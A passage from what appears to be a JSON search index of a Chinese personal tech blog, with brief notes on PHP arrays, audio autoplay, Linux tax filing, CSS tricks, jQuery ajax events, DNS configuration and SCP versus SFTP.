Blog - 软件编程实践 HelloDog 495884965 :: 痞客邦 :: 殆己 たかぎ Yulin Lewis’ Blog 萌芽網頁-萌芽系列網站入口網 咖啡偶-IT日常 - pveCLI Jenifer.Code.World - Jenifer 的技術筆記 Faryne的程式設計館 Lounge IT – 以慵懶為生的工程師筆記誌 ","date":"2018-05-14","objectID":"/blog/links/:8:0","tags":null,"title":"好站連結","uri":"/blog/links/"},{"categories":null,"content":"網路 (44) 海南弱電小胡 - YouTube T-888的个人空间_哔哩哔哩_bilibili 🧂 = 鹽🧂的記事本 = (　´∀｀)ヵヵヵ 林志祥的網誌分享 Jan Ho 的網絡世界 ","date":"2018-05-14","objectID":"/blog/links/:9:0","tags":null,"title":"好站連結","uri":"/blog/links/"},{"categories":null,"content":"Hack Hack543 - Your trusted partner at cybersecurity ","date":"2018-05-14","objectID":"/blog/links/:10:0","tags":null,"title":"好站連結","uri":"/blog/links/"},{"categories":null,"content":"Windows The Skeptical Software Engineer ","date":"2018-05-14","objectID":"/blog/links/:11:0","tags":null,"title":"好站連結","uri":"/blog/links/"},{"categories":null,"content":"MIS MIS的背影 | IT的隨筆紀錄 ","date":"2018-05-14","objectID":"/blog/links/:12:0","tags":null,"title":"好站連結","uri":"/blog/links/"},{"categories":null,"content":"掛了觀察中 rj-bai ’s Blog ","date":"2018-05-14","objectID":"/blog/links/:13:0","tags":null,"title":"好站連結","uri":"/blog/links/"},{"categories":["PHP"],"content":"回傳值 array_slice回傳是提取出來陣列 array_splice回傳是提取出來陣列 看來return 出來東西都是一樣 ","date":"2018-05-14","objectID":"/blog/posts/PHP%E7%9A%84array-slice%E8%88%87array-splice%E5%B7%AE%E5%88%A5/:1:0","tags":["PHP","JavaScript","splice","slice","array"],"title":"PHP的array_slice與array_splice差別","uri":"/blog/posts/PHP%E7%9A%84array-slice%E8%88%87array-splice%E5%B7%AE%E5%88%A5/"},{"categories":["PHP"],"content":"帶進度array參數 array array_slice ( array $array , int $offset [, int $length = NULL [, bool $preserve_keys = FALSE ]] ) array array_splice ( array \u0026$input , int $offset [, int $length = count($input) [, mixed $replacement = array() ]] ) 會發現上面兩者回傳都一樣，但帶進去陣列參數執行結果不一樣 array_splice大致上跟JavaScript的splice一樣 ","date":"2018-05-14","objectID":"/blog/posts/PHP%E7%9A%84array-slice%E8%88%87array-splice%E5%B7%AE%E5%88%A5/:2:0","tags":["PHP","JavaScript","splice","slice","array"],"title":"PHP的array_slice與array_splice差別","uri":"/blog/posts/PHP%E7%9A%84array-slice%E8%88%87array-splice%E5%B7%AE%E5%88%A5/"},{"categories":["PHP"],"content":"結論 兩者最大不同是一個call by reference一個call by value 怎麼看呢?看文件上面有個\u0026 PHP Object好像也是call by reference(address) 參考來源: php - why array_slice() and array_splice() doing the same? - Stack Overflow PHP: how to ‘cut’ my array? - Stack Overflow PHP: Objects and references - Manual 10件在PHP7中不要做的事情 | 程序师 ","date":"2018-05-14","objectID":"/blog/posts/PHP%E7%9A%84array-slice%E8%88%87array-splice%E5%B7%AE%E5%88%A5/:3:0","tags":["PHP","JavaScript","splice","slice","array"],"title":"PHP的array_slice與array_splice差別","uri":"/blog/posts/PHP%E7%9A%84array-slice%E8%88%87array-splice%E5%B7%AE%E5%88%A5/"},{"categories":["HTML"],"content":"最近做專案都用到audio autoplay，但發現手機chrome不能自動播放，但是Firefox 這根手機瀏覽器設定有關係，現在像chrome預設都是用 媒體 自動關閉播放 我去設定看Firefox播放…，難怪在播放音樂清單網頁，Firefox在螢幕關閉 音樂還可以繼續放，但Chrome就不行了…，現在大概知道應該就是這個原因 解決方法，就是手機要做一個按鈕給使用者去做播放 這邊有簡單用了，position:absoulte置中方法做一個東西 http://jsbin.com/pejuvakuko/1/edit?html,css,output $('svg').click(function(){ audio.play(); $('svg').hide(); }) 所以大概簡單做了一下這個 參照最近學會的absolute置中方法 ","date":"2018-05-13","objectID":"/blog/posts/audio%E5%92%8Cvideo%E5%9C%A8%E6%89%8B%E6%A9%9F%E4%B8%8A%E4%B8%8D%E8%83%BDautoplay%E5%95%8F%E9%A1%8C/:0:0","tags":["HTML","mp4","audio","video","autoplay"],"title":"audio和video在手機上不能autoplay問題","uri":"/blog/posts/audio%E5%92%8Cvideo%E5%9C%A8%E6%89%8B%E6%A9%9F%E4%B8%8A%E4%B8%8D%E8%83%BDautoplay%E5%95%8F%E9%A1%8C/"},{"categories":["HTML"],"content":"loading https://jsbin.com/diyavuyihi/1/edit?html,css,output 下次做這個東西，希望別再踩到雷 其實，手機瀏覽器可以讓使用者設定 但預設幾乎都是關閉的 Chrome 66讓數百萬款網頁遊戲消音，Google緊急調整自動播放政策 | iThome ","date":"2018-05-13","objectID":"/blog/posts/audio%E5%92%8Cvideo%E5%9C%A8%E6%89%8B%E6%A9%9F%E4%B8%8A%E4%B8%8D%E8%83%BDautoplay%E5%95%8F%E9%A1%8C/:0:1","tags":["HTML","mp4","audio","video","autoplay"],"title":"audio和video在手機上不能autoplay問題","uri":"/blog/posts/audio%E5%92%8Cvideo%E5%9C%A8%E6%89%8B%E6%A9%9F%E4%B8%8A%E4%B8%8D%E8%83%BDautoplay%E5%95%8F%E9%A1%8C/"},{"categories":["實用工具"],"content":"最近看到報稅能用Mac或Linux 剛好又懶的請假去現場排隊 家裡有一個Linux 就當勇者，用Linux報稅(一堆教學都是Mac… orz) 這邊只做踩到雷筆記 詳細過程這邊寫得很清楚 2018 Mac 報稅教學 ，線上申報、繳稅、綜所稅（健保卡/自然人憑證教學） - 蘋果仁 - 你的科技媒體 2018 年全民報稅季：用 Mac 網路報稅 超簡單！線上申報、繳稅、綜所稅教學 - 電腦王阿達 我是選健保卡 https://efile.tax.nat.gov.tw/irxw/index.jsp 詳細步驟我就不寫了… 我只記錄我卡住的地方 照作業系統下載程式 裡面有教學文件 {% asset_img 1525010735-dc0e6c3202efa14ae0b644876d5863b1.png %} 憑證記得要案加入信任服務 ![01](2018年用elementaryOS報稅小記/01.png slug) 這邊照他做apt-get update跟apt-get upgrade 之後讀卡機套件需要裝(我一開始沒裝) 解壓縮可以直接GUI拖移XD ![02](2018年用elementaryOS報稅小記/02.png slug) ![03](2018年用elementaryOS報稅小記/03.png slug) ![04](2018年用elementaryOS報稅小記/04.png slug) 其實我做到上圖有卡住，有一直試sudo ./Install 和sudo ./UnInstall 不過一直失敗…，後來重開機，再重安裝就正常了…. ![05](2018年用elementaryOS報稅小記/05.png slug) 我沒用加入信任服務狀態下 不正常的圖示，正常紅色有可能是剛剛裝的東西或憑證沒加入信任服務 很開心點選下一步，他說沒有讀到讀卡機 參考阿呆的blog: Linux 晶片卡讀卡機 使用心得 apt-get install pcsc-tools pcscd 安裝完，就能讀取了XD 然後順利繳稅… 愉悅!!! 等等…超商繳稅在哪裡 近年來配合推廣節能減碳，民眾在家裡就可以列印自繳稅款繳款書。 列印附條碼繳款書操作方法如下： 首先至「財政部稅務入口網」(網址：http://www.etax.nat.gov.tw/) 網站首頁 點選「線上服務」，再選擇「電子申報繳稅服務」 進入「自繳繳款書三段式條碼列印(線上版)」點選欲列印之繳款書，並鍵入完整基本資料，即可列印條碼繳款書。 民眾亦可進入「自繳繳款書三段式條碼列印(離線版)，下載離線版程式，就能批次列印條碼繳款書，即便在入口網網站或網路連線異常時，服務皆不中斷，十分便利。 納稅義務人可持條碼繳款書，至代收稅款之金融機構繳納(郵局不代收)，如稅額在-2萬元以下案件，亦可選擇至便利商店以現金繳納，惟超過繳納期限2天後之案件，因有加徵滯納金及滯納利息之情形，超商無法代收，只能至金融機構繳納。 「自繳繳款書三段式條碼列印」係提供產製列印條碼繳款書之平台，僅具有自動檢核統一編號或身分證統一編號編碼邏輯性，並無上傳或儲存功能，納稅義務人無須擔心個人資料外洩。 免出門就能列印自繳稅款繳款書 @ Canny 部落格 :: 隨意窩 Xuite日誌 點選 「綜合所得稅結算稅額繳款書(自行繳納)—15G」 我打算在公司用一用列印出來 技術小記 雖然沒看一仔細技術，大約猜測是用Websocket串起來的 那個安裝我猜測是在本機架Websocket 讀取讀卡機? 算了，我沒有仔細看，先別做結論 至於之前有跟同事討論到websocket有跨網域問題 但加入安全認證可以跨網域? 這點可能之後可以玩一下 ","date":"2018-05-09","objectID":"/blog/posts/2018%E5%B9%B4%E7%94%A8elementaryOS%E5%A0%B1%E7%A8%85%E5%B0%8F%E8%A8%98/:0:0","tags":["報稅","Linux"],"title":"2018年用elementaryOS報稅小記","uri":"/blog/posts/2018%E5%B9%B4%E7%94%A8elementaryOS%E5%A0%B1%E7%A8%85%E5%B0%8F%E8%A8%98/"},{"categories":["HTML"],"content":"平常沒什麼在用audio 最近專案有用到，就簡單來記錄一下 \u003caudio\u003e 使用時候，不會顯示出頁面上 預設也不會播音樂 autoplay會自動播放 controls會顯示出來頁面 loop循環播放 preload有三種載入狀態 auto頁面載入時侯會把檔案載入進來 metadata 頁面載入時侯會把檔案載入進來 none頁面載入時候不會把資料載入進來 muted靜音 還有很常看到使用socure搭配，假如多個音源檔(例如:ogg和mp3) 可以使用socure 不過看HTML source Tag 竟然還可以用在picture上面 相信做rwd可能會比較方便 不用寫jsXD 有空來筆記 ","date":"2018-05-01","objectID":"/blog/posts/HTML5%E6%8E%A7%E5%88%B6audio%E5%88%9D%E9%AB%94%E9%A9%97/:0:0","tags":["audio","HTML"],"title":"HTML5控制audio初體驗","uri":"/blog/posts/HTML5%E6%8E%A7%E5%88%B6audio%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["實用工具"],"content":"最近由於工作連各各主機，帳號密碼都不一樣 每次都需要點開信件/文件去複製 這之中希望能縮短時間 之前有看到我同事有在用便利貼軟體 雖然我沒有問，不過現在這個工作非常需要 我Google到幾個 PNotes / PNotes.NET ㄟ批幫幫忙: PNotes使用教學 PNotes 9.3.0 免安裝中文版 - 桌面便利貼軟體 - 阿榮福利味 - 免費軟體下載 有看到官網比較PNotes / PNotes.NET 好奇可以搭配Word/PDF功能 裝了.NET版本 這個功能真的很多，不過不太會用 我用內建虛擬桌面…竟然會跑開(不確定可以設定) 只是用中文介面文字模糊… 所以試用一下就不用了 ATnotes ATnotes 9.5 免安裝中文版 - 好用桌面便利貼 - 阿榮福利味 - 免費軟體下載 ATnotes 免費輕巧的桌面便利貼 - 香腸炒魷魚 這個還滿像我同學用的 介面一般，檔案最小 推薦只單純用便利貼工具的人用 不需要雜七雜八功能 推薦用這個 Stickies Stickies 9.0e 免安裝中文版 - 桌面便利貼軟體 - 阿榮福利味 - 免費軟體下載 [免費下載]強大的 Stickies 多用途桌面便利貼 - Angus福利社 這可能是目前看過介面最好看一個 檔案又不會太大 而且刪除預設會把先前的便利貼放到垃圾桶 這樣就不用怕誤刪的囧境 ATnotes、Stickies內建win10切換不會消失在桌面 話說還看到有網路功能… 但Google一下，好像有區域網路聊天功能 用Stickies便利貼幫您記事提醒還可以…..聊天 @ Xian的家 :: 隨意窩 Xuite日誌 結論 以功能為主的推薦使用Stickies 單存想用用便利貼而已ATnotes Dexpot 便利貼同步每個桌面方法 在Dexpot可以設定桌面規則 設定便利貼同步到每個視窗 {% asset_img dexpot1.png %} ","date":"2018-05-01","objectID":"/blog/posts/%E5%A5%BD%E7%94%A8%E7%9A%84%E4%BE%BF%E5%88%A9%E8%B2%BC%E8%BB%9F%E9%AB%94/:0:0","tags":["virtual desktop","desktop","dextop"],"title":"好用的便利貼軟體","uri":"/blog/posts/%E5%A5%BD%E7%94%A8%E7%9A%84%E4%BE%BF%E5%88%A9%E8%B2%BC%E8%BB%9F%E9%AB%94/"},{"categories":["網頁特效"],"content":"平常在用checkout都用在分支 不過今天查看checkout也可以用在還原 其實這是用checkbox css hack方法 之前有一篇寫過了…但沒想到之前那篇沒寫完整 還有之前有看過改CSS取消原本樣式 改天來記錄一下吧!! [CSS] checkbox hack 模擬在網頁開視窗 簡單來講，就是利用checkbox CSS hack :checked跟+或~的條件(Selector) 來實做這個問題 實做後比較好懂 自訂checkbox方法 https://jsbin.com/bebetiqalu/edit?html,css,output ","date":"2018-04-26","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8CSS%E8%87%AA%E8%A8%82checkbox%E6%96%B9%E6%B3%95/:0:0","tags":["css","css hack","checkbox"],"title":"使用CSS自訂checkbox方法","uri":"/blog/posts/%E4%BD%BF%E7%94%A8CSS%E8%87%AA%E8%A8%82checkbox%E6%96%B9%E6%B3%95/"},{"categories":["CSS"],"content":"今天看到了gif在display:block 竟然動畫才開始動 查了一下下，原來這跟render有關係 在此做一下筆記… “display:none” is Your Friend If you use display:none on the GIF’s html tag, the GIF will not be rendered at all, and will not use any CPU or GPU resources. See this and this for explanations. html - Does hiding an animated GIF with CSS conserve browser resources? - Stack Overflow display:none; elements are not in the render tree all, so they will perform better at face value. https://stackoverflow.com/a/11757103 How Browsers Work: Behind the scenes of modern web browsers - HTML5 Rocks 前端新手村 都市傳說之隱藏元素的手法 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 有在javascript - Proper way to reset a GIF animation with display:none on Chrome - Stack Overflow 看到使用JSFiddleFirefox,IE都會重置 但是CHROME不會… 有在裡面文章找到解法https://stackoverflow.com/a/21104927 http://jsfiddle.net/F8Q44/19/ $('img').show().each(function() { this.offsetHeight; }).prop('src', 'image src'); 這個問題好像是我之前寫的render問題解決方法… [JavaScript] 網頁渲染的過程 (rendering pipline) « 進擊的程式新手 常使用prop用在checked上面，不過今天看到這個用法 查看了一下官網文件 It should be used when setting selectedIndex, tagName, nodeName, nodeType, ownerDocument, defaultChecked, or defaultSelected. Since jQuery 1.6, these properties can no longer be set with the .attr() method. They do not have corresponding attributes and are only properties. 有些以前沒辦法控制selectedIndex, tagName, nodeName, nodeType, ownerDocument, defaultChecked, or defaultSelected.這些東西 不過現在jQuery可以用prop抓到資訊 javascript - jquery .prop(‘defaultSelected’) seems to malfunction in IE9 - Stack Overflow \u003cform action=\"\"\u003e \u003cinput type=\"checkbox\" name=\"\" id=\"\" checked\u003e \u003cinput type=\"reset\" value=\"test\"\u003e \u003c/form\u003e elements of type “reset” are rendered as buttons, with a default click event handler that resets all of the inputs in the form to their initial values. 很多網站教清空表單 但其實正確要說還原表單預設值 (怎麼會寫到這個，因為玩到checkbox,defaultSelected就突然想到reset問題，結果不出所料) 結論沒事還是不要用gif做倒數計時… ","date":"2018-04-25","objectID":"/blog/posts/%E5%9C%A8display-none%E6%83%85%E6%B3%81%E4%B8%8BGIF%E4%B8%8D%E6%9C%83%E8%A2%ABrender/:0:0","tags":["display","CSS","gif","render","HTML","image"],"title":"在display-none情況下GIF不會被render","uri":"/blog/posts/%E5%9C%A8display-none%E6%83%85%E6%B3%81%E4%B8%8BGIF%E4%B8%8D%E6%9C%83%E8%A2%ABrender/"},{"categories":["jQuery"],"content":"今天看到Ajax-Global Ajax Event Handlers .ajaxComplete()、.ajaxError()、.ajaxSend()、.ajaxStart()、.ajaxStop()、.ajaxSuccess() | 阿沙布魯 - 點部落 平常都不會這樣寫，發現這樣寫可以模組化 今天用少部份時間，來研究出來ajax event來實做出動畫特效 備註：ajax event都是jQuery自訂的，原JavaScript沒有這個東西 拿線上別人寫好的AJAX DEMO小改 jQuery AJAX request demo - JSFiddle $(document).on('ajaxSend',function(){ $('#overlay').show(); $('#overlay').width('100%'); $(window).on('beforeunload',function(){ if( confirm('查詢未完成，是否要離開?')){ return true; } return false; }); }).on('ajaxComplete',function(){ $('#overlay').width('0px'); $(window).off('beforeunload'); }); 注意：jQuery onload 3.0就不能用了，要使用beforeunload才對 各个浏览器中对于beforeunload事件和unload事件的对比 | {XFE} 其實這個東西還可以寫一篇才對….. 原本想說CSS不會花太多時間 結果還是花了一點點…. #overlay{ width: 0%; height: 100%; display: none; position: fixed; top:0px; left:0px; transition: all .3s; overflow: hidden; } #overlay_mask{ width: 100vw; height: 100%; font-size: 6em; background: rgba(0,0,0,0.6); display:flex; align-items:center; justify-content:center; /* display:none; */ } #overlay_mask那邊花了不少時間解決 原本是用1000px，但覺得應該有更好的 使用vh沒有占全版 vw就解決了 vw——代表视窗(Viewport)的宽度为1%，在我们的例子里50vw = 500px。 vh——窗口高度的百分比 50vh = 400px。 vmin——vmin的值是当前vw和vh中较小的值。在我们的例子里因为是横向模式，所以50vim = 400px。 vmax——大尺寸的百分比。50vmax = 500px。 著作权归作者所有。 商业转载请联系作者获得授权,非商业转载请注明出处。 原文: https://www.w3cplus.com/css/simplify-your-stylesheets-with-the-magical-css-viewport-units.html © w3cplus.com 視區相關單位vw, vh..簡介以及可實際應用場景 - 掃文資訊 花了不少時間，但相信這個對未來實做[程式][JQuery] 讓AJAX運作的時候，跳出loding的訊息。－Part 1 @ 四處流浪的阿基。I am Vagrant Walker :: 痞客邦 :: .ajaxComplete() - runs for every request that completes, use this when you want to do something with each request/result. Note that this doesn’t replace the success handler, since the parsed data is not one of the arguments (and it runs even when there’s an error) - you may want .ajaxSuccess() in some per-request situations instead. .ajaxStop() - runs when every batch of requests completes, usually you’d use this in combination with .ajaxStart() for things like showing/hiding a “Loading…” indicator of some sort - or to do something else once a batch of AJAX requests finishes, like a master last step. ajax - jquery::ajaxStop() versus jquery::ajaxComplete() - Stack Overflow 恩…英文弱弱的…有找一下中文版說明XD .ajaxComplete() ——運行每個請求完成,用這個當你想做一些與每個請求/結果。 注意這並不替換 success 處理程序，因為解析的數據不是一個參數( 即使有錯誤，它也運行) - 你可能需要 .ajaxSuccess() 在某些per-request情況下。 .ajaxStop() ——運行當完成每批請求,通常你有使用這種結合 .ajaxStart() 例如顯示/隱藏某種\"正在載入。“指示器,或者做一些其他一批ajax請求完成後,就像一個主人的最後一步。 jquery::ajaxStop() 与 jquery::ajaxComplete( )_ajax_帮酷编程问答 相信這個能跟下面UI整合，有空再實做 waitMe busy-load jQuery BlockUI Plugin 因為BlockUI看到是用$(document).ajaxStop($.unblockUI); ，有去找兩著比較ajaxComplete、ajaxStop 我看到範例是用ajaxComplete，不過照文件說用ajaxStop做顯示/隱藏是最好的樣子 這篇其實有很多雜七雜八的東西，其實要分開寫會比較好… 不過哪天再踩到雷再補好了 ","date":"2018-04-24","objectID":"/blog/posts/jquery%E8%87%AA%E8%A8%82%E7%9A%84ajax-Event/:0:0","tags":["jQuery","ajax","event"],"title":"jQuery自訂的ajax Event","uri":"/blog/posts/jquery%E8%87%AA%E8%A8%82%E7%9A%84ajax-Event/"},{"categories":["CSS"],"content":"一般我們學CSS很常看到:link,:active,:visited,:hover這幾個很常用在a 不過今天我看到一個範例 是用:active對div做點擊換背景事件!!! 沒想到竟然可以對div做變化 一般很常用mousedown,mouseup做處理 這樣可以用CSS一次解決寫兩個JavaScript 趕快來筆記一下 :active除了對div會有影響 看我實作測試 http://jsbin.com/facifuvina/edit?html,css,js,output 點擊div時候，其實body:active也會跟著變色 所以:active點子子層的時候也會跟著影響父層 所以使用也要了解這個問題！ 試著看API能不能看到一些:active資訊 An element is said to be in a formal activation state between the time the user begins to indicate an intent to trigger the element’s activation behavior and either the time the user stops indicating an intent to trigger the element’s activation behavior, or the time the element’s activation behavior has finished running, which ever comes first. An element is said to be being actively pointed at while the user indicates the element using a pointing device while that pointing device is in the “down” state (e.g. for a mouse, between the time the mouse button is pressed and the time it is depressed; for a finger in a multitouch environment, while the finger is touching the display surface). HTML Standard 不知道是不是這個內容關係 不過在:active | CSS-Tricks這個網站有找到所有element都可以這樣用 然後看一下支援表，沒想到支援度這麼高 以前就有這個東西，都不知道orz 這個樣式可能會被後聲明的其他鏈接相關的偽類覆蓋，這些偽類包括 :link，:hover和 :visited。為了正常加上樣式，需要把 :active的樣式放在所有鏈接相關的樣式後，這種鏈接偽類先後順序被稱為LVHA順序: :link — :visited — :hover — :active。 注意: 在有多鍵鼠標的系統中，CSS 3 規定 :active 偽類必須只匹配主按鍵；對於右手操作鼠標來說就是左鍵。 :active - CSS：層疊樣式表 | MDN 改天來記錄LVHA順序筆記吧!! 參考來源： :active - CSS: Cascading Style Sheets | MDN HTML Standard :active | CSS-Tricks ","date":"2018-04-22","objectID":"/blog/posts/CSS%E8%A3%A1active%E9%BB%9E%E6%93%8A%E4%BA%8B%E4%BB%B6%E5%A6%99%E7%94%A8/:0:0","tags":["CSS","\\:active"],"title":"CSS:active點擊事件妙用","uri":"/blog/posts/CSS%E8%A3%A1active%E9%BB%9E%E6%93%8A%E4%BA%8B%E4%BB%B6%E5%A6%99%E7%94%A8/"},{"categories":["實用工具"],"content":"最近公司做一個動作，需要把Excel檔案資料欄位 複製到SQL做IN查詢動作 不過資料真的太多了，需要做分開處理 目前文件說5000分別丟到SQL去查 不過看了一下資料，共10000多筆資料 查一下有什麼方法可以交給電腦處理 ","date":"2018-04-20","objectID":"/blog/posts/%E4%BB%A5%E5%9B%BA%E5%AE%9A%E8%A1%8C%E6%95%B8%E5%88%87%E5%89%B2%E6%96%87%E5%AD%97%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/:0:0","tags":["emeditor","split","txt"],"title":"以固定行數切割文字檔案方法","uri":"/blog/posts/%E4%BB%A5%E5%9B%BA%E5%AE%9A%E8%A1%8C%E6%95%B8%E5%88%87%E5%89%B2%E6%96%87%E5%AD%97%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"使用Emeditor 用 EmEditor 分割、合併超大 TXT 純文字檔 – 【重灌狂人】 「工具」→「分割/合併」→「把目前文件或指定檔案分割成多個檔案」 資料夾和檔名可以不用設定 資料夾$(DIr)\\$(Filename)_split_$(SplitRunSerial) 檔案$(Filename)_$(SplitFileSerial).$(Ext) 一直下一步就可完完成 其實步驟還滿簡單的 所以就沒截圖 ","date":"2018-04-20","objectID":"/blog/posts/%E4%BB%A5%E5%9B%BA%E5%AE%9A%E8%A1%8C%E6%95%B8%E5%88%87%E5%89%B2%E6%96%87%E5%AD%97%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/:1:0","tags":["emeditor","split","txt"],"title":"以固定行數切割文字檔案方法","uri":"/blog/posts/%E4%BB%A5%E5%9B%BA%E5%AE%9A%E8%A1%8C%E6%95%B8%E5%88%87%E5%89%B2%E6%96%87%E5%AD%97%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"Linux command split切割 split -l 10000 ping.txt ping.part -d -l 是指行數， 指定ping.txt到ping.part -d沒有打的話會命名partaa,partab… -d有打的話會是part01,part02 更多可參考： Linux 使用 split 指令將大檔案切割成小檔案，方便網路傳輸 - G. T. Wang split命令_Linux split 命令用法详解：分割任意大小的文件 How to split LARGE TEXT file into smaller using split utility on Windows - YouTube ","date":"2018-04-20","objectID":"/blog/posts/%E4%BB%A5%E5%9B%BA%E5%AE%9A%E8%A1%8C%E6%95%B8%E5%88%87%E5%89%B2%E6%96%87%E5%AD%97%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/:2:0","tags":["emeditor","split","txt"],"title":"以固定行數切割文字檔案方法","uri":"/blog/posts/%E4%BB%A5%E5%9B%BA%E5%AE%9A%E8%A1%8C%E6%95%B8%E5%88%87%E5%89%B2%E6%96%87%E5%AD%97%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"今天在鳥哥看到 例題： 我的主機使用 DHCP 取得 IP ，很奇怪的，當我修改過 /etc/resolv.conf 之後，隔不多久這個檔案又會恢復成原本的樣子，這是什麼原因？ 該如何處理？ 答： 因為使用 DHCP 時，系統會主動的使用 DHCP 伺服器傳來的資料進行系統設定檔的修訂。因此，你必須告知系統，不要使用 DHCP 傳來的伺服器設定值。 此時，你得要在 /etc/sysconfig/network-scripts/ifcfg-eth0 等相關檔案內，增加一行：『PEERDNS=no』，然後重新啟動網路即可。 此外，如果你有啟動 CentOS 6.x 的 NetworkManager 服務，有時候也可能會產生一些奇特的現象哩！所以鳥哥是建議關掉它的！^_^ 鳥哥的 Linux 私房菜 – DNS Server 很久之前我有寫過類似的問題 不過後來是用crontab來重覆寫這個問題 今天有看到一個方法 由於我用的是ubuntu, 沒有fedora的/etc/sysconfig/network-scripts/ifcfg-eth0 設定檔. 但是, 可以修改/etc/dhcp3/dhclient.conf來達到同樣的目的: $ sudo nano /etc/dhcp3/dhclient.conf 加入: supersede domain-name-servers 168.95.1.1, 8.8.8.8; supersede domain-name “domain1.com domain2.com”; 應該是跨發佈系統的. Linux DHCP DNS設定問題 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 目前沒有試過這個東西 supersede domain-name-servers 8.8.8.8, 8.8.4.4; Ubuntu DNS 設定 @ Welkin小窩 :: 痞客邦 :: prepend domain-name-servers 8.8.8.8; 不過動物機還是不管用，但很多人好像都成功了 不知道為什麼 networking - How to override the DHCP-provided nameserver? - Ask Ubuntu A resolution that will resolve your problem is to configure your resolvconf package. This will give precedence to your preferred nameservers as well as any other desired settings resolv.conf settings such as search and domain preferences. Edit the file: /etc/resolvconf/resolv.conf.d/head Place your desired nameservers and any other configurations you want to take preference when there is a network change there. When any changes to the network happen, the configuration there will always take precedence. An example of the /etc/resolvconf/resolv.conf.d/head file: # Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8) # DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN nameserver 8.8.8.8 search mydomain.com 安裝resolvconf 照head設定dns 竟然成功了 先記錄 nameserver 8.8.8.8 nameserver 192.168.1.1 不過之前中華DNS好像有問題 最近又不會了… 可能正式機不會動 參考來源： 鳥哥的 Linux 私房菜 – DNS Server Linux DHCP DNS設定問題 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 Ubuntu DNS 設定 @ Welkin小窩 :: 痞客邦 :: VPC DHCP类型的ECS修改DNS networking - How to override the DHCP-provided nameserver? - Ask Ubuntu ","date":"2018-04-19","objectID":"/blog/posts/%E5%9C%A8Raspbain%E8%A8%AD%E5%AE%9ADCHP%E6%99%82%E5%BE%8CDNS/:0:0","tags":["Linux","Raspberry PI","DNS DHCP","resolvconf","Ubuntu"],"title":"在Raspbain設定DNS","uri":"/blog/posts/%E5%9C%A8Raspbain%E8%A8%AD%E5%AE%9ADCHP%E6%99%82%E5%BE%8CDNS/"},{"categories":["程式心法"],"content":"因為先前工作是使用DB2 不過…最近新的工作使用Mysql 發現竟然--註解不能用… Google一下，原來MySQL註解有3種 # /**/ -- (但這種前後要留白) ex : – test 希望下次不要踩到一樣的雷XD ","date":"2018-04-18","objectID":"/blog/posts/mysql%E6%9F%A5%E8%A9%A2%E4%BD%BF%E7%94%A8-%E8%A8%BB%E8%A7%A3%E8%B8%A9%E5%88%B0%E7%9A%84%E9%9B%B7/:0:0","tags":["mysql","comment","註解"],"title":"mysql查詢使用--註解踩到的雷","uri":"/blog/posts/mysql%E6%9F%A5%E8%A9%A2%E4%BD%BF%E7%94%A8-%E8%A8%BB%E8%A7%A3%E8%B8%A9%E5%88%B0%E7%9A%84%E9%9B%B7/"},{"categories":["程式心法"],"content":"最近在公司做使用PHP做sftp傳輸上去 結果一直出問題 使用ssh2_scp_send傳輸檔案 公司內部測試可以傳檔案 但別的主機卻不能 我在我的主機安裝ssh2環境（改天來補筆記） 發現還是不能連到那台 後來我決定，試著打 sftp command line連過去 看到顯示freeFTPd，我就找相關資料 freeFTPd是window平台，可以免費架設sftp/ftp東西 不過我爬到… SFTP 雖然提供了一個安全可靠的傳送渠道，但是SFTP不能直接用瀏覽器開啟。需要使用支援SFTP的軟件才能進入SFTP Server，例如CuteFTP、WinSCP、或者Client Side的FileZilla。還有，freeFTPd的SFTP是不能用SSH登入及使用SCP傳送檔案的。 在Windows下使用freeFTP來架設SFTP Server \u0026 我是我，葉子 - yzl1218 # 天空部落 TIAN # 有找到使用copy(\"ssh2.sftp://{$ftp_IP}\".$remote, $local);就可以用了 PHP-sftp文件上传-11750810-51CTO博客 我一直以為SCP跟SFTP是差不多東西 但結果證明是不一樣的 SCP沒有續傳功能，有點類似做cp指令動作透過ssh sftp是基於ftp使用ssh SCP和CP命令相似，SFTP和FTP的使用方法也類似。SCP和SFTP的共同之處在於「使用SSH將文件加密才傳輸的」 使用「WinSCP」或者「FileZilla」之類的客戶端，還可以和Windows之間進行文件傳輸。 SCP和SFTP的不同之處，首先就是之前提到的，SCP使用「SCP命令」，SFTP則類似「FTP處理文件」的使用方式。 它們的不同之處還不止如此，還有「SCP比較簡單，是輕量級的，SFTP的功能則比較多」。 詳細說的話，雖然還有很多不同之處，但2者的最大不同之處在於「SFTP在文件傳輸過程中中斷的話，連接後還可以繼續傳輸，但SCP不行」。 SCP和SFTP區別 - - ITeye博客 經過這次…. 下次應該不會再踩這個雷了吧 ","date":"2018-04-16","objectID":"/blog/posts/scp%E8%B7%9Fsftp%E6%98%AF%E4%B8%8D%E6%A8%A3%E7%9A%84%E6%9D%B1%E8%A5%BF/:0:0","tags":["scp","sftp"],"title":"scp跟sftp是不一樣的東西","uri":"/blog/posts/scp%E8%B7%9Fsftp%E6%98%AF%E4%B8%8D%E6%A8%A3%E7%9A%84%E6%9D%B1%E8%A5%BF/"},{"categories":["寫程式一些事"],"content":"hexo設定貼圖方法 在 post_asset_folder: true {% asset_path slug %} ![title](./slug) [title](slug) 參考來源 資產資料夾 | Hexo ","date":"2018-04-08","objectID":"/blog/posts/hexo%E5%9C%A8blog%E8%B2%BC%E5%9C%96/:0:0","tags":["hexo","img"],"title":"hexo在blog貼圖","uri":"/blog/posts/hexo%E5%9C%A8blog%E8%B2%BC%E5%9C%96/"},{"categories":["寫程式一些事"],"content":"最近犯了一個小錯誤 Hexo裡的config裡面 repo: 放https開頭 但是以為ssh金鑰能登入…. 但突然想到…我以前有寫過BitBucket [BitBucket]做git pull一直問你輸入密碼 | 程式狂想筆記 